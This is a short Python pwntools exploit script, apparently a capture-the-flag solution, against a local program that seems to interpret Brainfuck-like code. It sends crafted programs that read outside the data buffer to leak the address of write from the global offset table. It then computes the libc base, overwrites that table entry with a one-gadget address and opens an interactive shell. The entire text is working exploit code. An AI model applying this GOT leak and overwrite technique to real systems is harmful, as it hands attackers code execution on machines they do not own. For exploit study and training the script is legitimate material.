from pwn import *

p = process(['python3', 'main.py'])
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
runtime = ELF('runtime.so')
data_ptr = runtime.symbols['DATA']
write_got = runtime.got['write']
offset = data_ptr-write_got+0x10


def read_nonzero_byte(off):
    p.recvuntil('>>> ')
    p.sendline('+[' + '<' * off + '[.' + '>' * (off + 1) + ']]')
    return p.recvn(1)


def read_ptr(off):
    result = ''
    # skip zero at high addr, leak low 6 bytes.
    for i in range(off - 5, off + 1):
        result = read_nonzero_byte(i) + result
    return u64(result.ljust(8, '\x00'))


def write_ptr(off, value):
    p.recvuntil('>>> ')
    value = p64(value)
    # write low 6 bytes
    p.sendline('+[' + '<' * off + '[,>]' + '>' * (off - 5) + ']')
    log.info("override write addr @ %s"%(value))
    p.send(value[:6])

# leak
write_addr = (read_ptr(offset))
libc_base = write_addr - libc.symbols['write']
log.success("libc base @ {:#x}".format(libc_base))

# overide with one gadget
write_ptr(offset, libc_base + 0x10a38c)
p.recvuntil('>>> ')
p.sendline('.')
p.interactive()
